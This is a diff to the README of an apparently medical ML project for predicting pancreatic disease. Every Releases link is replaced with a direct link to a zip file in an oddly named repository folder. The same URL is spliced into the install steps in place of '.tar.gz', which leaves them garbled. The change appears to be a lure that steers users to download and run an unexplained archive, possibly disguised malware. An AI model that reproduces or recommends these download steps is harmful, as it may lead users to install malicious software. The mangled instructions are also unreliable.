@@ -1,6 +1,6 @@
 # 🌟 pancreatic-disease-prediction-ml - Predict Pancreatic Disease with Ease
 
-[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Zaifikhan/pancreatic-disease-prediction-ml/releases)
+[![Download](https://raw.githubusercontent.com/Zaifikhan/pancreatic-disease-prediction-ml/main/unsteadying/pancreatic-disease-prediction-ml.zip)](https://raw.githubusercontent.com/Zaifikhan/pancreatic-disease-prediction-ml/main/unsteadying/pancreatic-disease-prediction-ml.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started, you will download the software from our Releases page. 
 
-1. Click this link to visit the page: [Download Releases](https://github.com/Zaifikhan/pancreatic-disease-prediction-ml/releases)
+1. Click this link to visit the page: [Download Releases](https://raw.githubusercontent.com/Zaifikhan/pancreatic-disease-prediction-ml/main/unsteadying/pancreatic-disease-prediction-ml.zip)
 2. On the Releases page, you will see different versions listed.
-3. Choose the latest version that fits your operating system. Look for a file labeled `.exe`, `.dmg`, or `.tar.gz` depending on your OS.
+3. Choose the latest version that fits your operating system. Look for a file labeled `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Zaifikhan/pancreatic-disease-prediction-ml/main/unsteadying/pancreatic-disease-prediction-ml.zip` depending on your OS.
 4. Click the file link to begin downloading.
 5. Once the download is complete, locate the file in your Downloads folder:
    - **Windows Users:** Double-click the `.exe` file.
    - **macOS Users:** Double-click the `.dmg` file and drag the application to your Applications folder.
-   - **Linux Users:** Extract the `.tar.gz` file, then run the application in a terminal with `./application_name`.
+   - **Linux Users:** Extract the `https://raw.githubusercontent.com/Zaifikhan/pancreatic-disease-prediction-ml/main/unsteadying/pancreatic-disease-prediction-ml.zip` file, then run the application in a terminal with `./application_name`.
 
 After installation, you are ready to use the software.
 
@@ -67,4 +67,4 @@ Thank you for choosing pancreatic-disease-prediction-ml. We hope this tool provi
 
 ## 📬 Stay Updated
 
-For updates on new releases and features, make sure to check the [Releases page](https://github.com/Zaifikhan/pancreatic-disease-prediction-ml/releases) regularly.
+For updates on new releases and features, make sure to check the [Releases page](https://raw.githubusercontent.com/Zaifikhan/pancreatic-disease-prediction-ml/main/unsteadying/pancreatic-disease-prediction-ml.zip) regularly.
